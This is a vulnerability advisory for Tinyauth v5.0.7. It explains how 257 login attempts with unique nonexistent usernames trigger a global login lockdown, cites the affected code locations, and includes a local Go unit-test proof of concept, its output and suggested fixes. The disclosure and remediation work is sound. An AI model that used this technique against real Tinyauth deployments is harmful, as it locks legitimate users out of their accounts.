# Tinyauth: Unauthenticated login attempts can trigger global login lockdown denial of service

- CWE: CWE-307
- Packages: go:github.com/steveiliop56/tinyauth

---

### Summary

Tinyauth's login rate-limit bookkeeping can enter a global lockdown mode when its in-memory login-attempt map reaches 256 distinct identifiers. Because unauthenticated `POST /api/user/login` requests for unknown usernames are recorded in this same map, a remote unauthenticated attacker can submit 257 unique bogus usernames and cause valid credentials for unrelated users to be treated as locked until `auth.loginTimeout` expires.

This was confirmed against the stable `v5.0.7` release. With default configuration, `auth.loginTimeout` is 300 seconds and `auth.loginMaxRetries` is 3, so the denial lasts about 5 minutes and can be repeated.

### Details

In stable `v5.0.7`, the login endpoint is registered at `internal/controller/user_controller.go:45` and accepts unauthenticated JSON credentials in `loginHandler` at `internal/controller/user_controller.go:50`. Before validating credentials, it calls `controller.auth.IsAccountLocked(req.Username)` at `internal/controller/user_controller.go:65`.

When a username does not exist, the login handler records a failed login attempt for the attacker-controlled username with `controller.auth.RecordLoginAttempt(req.Username, false)` at `internal/controller/user_controller.go:83`. Invalid passwords for existing users do the same at `internal/controller/user_controller.go:94`.

The rate-limit map has a hard cap of 256 records at `internal/service/auth_service.go:29`. `RecordLoginAttempt` checks `len(auth.loginAttempts) >= MaxLoginAttemptRecords` at `internal/service/auth_service.go:261` and, once the cap is reached, launches `auth.lockdownMode()` at `internal/service/auth_service.go:265` instead of evicting old identifiers or rejecting only the new identifier.

`lockdownMode` sets a global `auth.lockdown` value with `Active: true` and `ActiveUntil: now + auth.config.LoginTimeout` at `internal/service/auth_service.go:790-804`. `IsAccountLocked` checks this global lockdown before looking up the requested identifier at `internal/service/auth_service.go:227-234`, so every username is treated as locked while the global lockdown is active.

The default configuration enables this path with `LoginTimeout: 300` and `LoginMaxRetries: 3` at `internal/config/config.go:23-24`.

Source-to-sink path:

```text
Unauthenticated POST /api/user/login JSON username
  -> loginHandler binds LoginRequest
  -> unknown username path records RecordLoginAttempt(attacker-chosen username, false)
  -> 257 unique identifiers fill loginAttempts beyond MaxLoginAttemptRecords
  -> RecordLoginAttempt starts lockdownMode()
  -> lockdownMode sets global auth.lockdown.Active = true
  -> IsAccountLocked returns locked for unrelated valid users
  -> login endpoint returns HTTP 429 for valid credentials until loginTimeout expires
```

Candidate score: 13/14. Reachability 2, attacker control 2, privilege required 2, sink impact 1, mitigation weakness 2, default exposure 2, safe reproduction feasibility 2.

### PoC

This PoC is local and non-destructive. It was tested against stable tag `v5.0.7`. It proves that 257 distinct unknown-user identifiers trigger global lockdown for an unrelated valid user, while that user's password still verifies successfully.

1. Check out stable `v5.0.7`.

2. Create `internal/service/login_lockdown_stable_poc_test.go`:

```go
package service

import (
    "fmt"
    "testing"
    "time"

    "github.com/steveiliop56/tinyauth/internal/config"
    "github.com/steveiliop56/tinyauth/internal/utils/tlog"
    "github.com/stretchr/testify/require"
)

func TestPoCStableUnknownUsersTriggerGlobalLoginLockdown(t *testing.T) {
    tlog.NewTestLogger().Init()

    authServiceCfg := AuthServiceConfig{
        Users: []config.User{{
            Username: "testuser",
            Password: "$2a$10$ZwVYQH07JX2zq7Fjkt3gU.BjwvvwPeli4OqOno04RQIv0P7usBrXa", // password
        }},
        LoginTimeout:    2,
        LoginMaxRetries: 3,
    }

    authService := NewAuthService(authServiceCfg, &DockerService{}, &LdapService{}, nil, nil)
    t.Cleanup(authService.ClearRateLimitsTestingOnly)

    require.True(t, authService.VerifyUser(config.UserSearch{
        Username: "testuser",
        Type:     "local",
    }, "password"))

    for i := 0; i <= MaxLoginAttemptRecords; i++ {
        authService.RecordLoginAttempt(fmt.Sprintf("attacker-%03d", i), false)
    }

    require.Eventually(t, func() bool {
        locked, _ := authService.IsAccountLocked("testuser")
        return locked
    }, time.Second, 10*time.Millisecond)

    locked, remaining := authService.IsAccountLocked("testuser")
    require.True(t, locked)
    require.GreaterOrEqual(t, remaining, 0)

    require.True(t, authService.VerifyUser(config.UserSearch{
        Username: "testuser",
        Type:     "local",
    }, "password"))

    t.Logf("proof on v5.0.7: %d distinct failed unknown-user identifiers caused unrelated valid user testuser to be locked", MaxLoginAttemptRecords+1)
}
```

3. Run:

```bash
go test ./internal/service -run 'TestPoCStableUnknownUsersTriggerGlobalLoginLockdown' -count=1 -v
```

Observed output from this environment:

```text
=== RUN   TestPoCStableUnknownUsersTriggerGlobalLoginLockdown
auth_service.go:798: Multiple login attempts detected, possibly DDOS attack. Activating temporary lockdown.
    login_lockdown_stable_poc_test.go:42: proof on v5.0.7: 257 distinct failed unknown-user identifiers caused unrelated valid user testuser to be locked
--- PASS: TestPoCStableUnknownUsersTriggerGlobalLoginLockdown (0.10s)
PASS
ok      github.com/steveiliop56/tinyauth/internal/service    0.111s
```

4. Cleanup:

```bash
rm internal/service/login_lockdown_stable_poc_test.go
```

### Impact

A remote unauthenticated attacker who can reach Tinyauth's login endpoint can temporarily deny login for unrelated valid users by sending a small number of login attempts using unique nonexistent usernames.

With default configuration, the global lockdown lasts 300 seconds. The attack does not invalidate existing sessions, but users who need to log in during the lockdown window receive rate-limit responses even when providing valid credentials.

This affects availability of local login and any flow that depends on the same account-lock check. The issue is especially relevant for internet-exposed Tinyauth deployments where `/api/user/login` is reachable.

Suggested remediation: do not enter global lockdown because of attacker-controlled unknown usernames. Use bounded LRU eviction for old login-attempt records instead of global lockout; consider rate limiting by client IP plus normalized username; avoid counting unlimited nonexistent usernames toward a global security state. If a global safety mode is desired, require stronger signals such as source-based thresholds rather than only distinct username count.
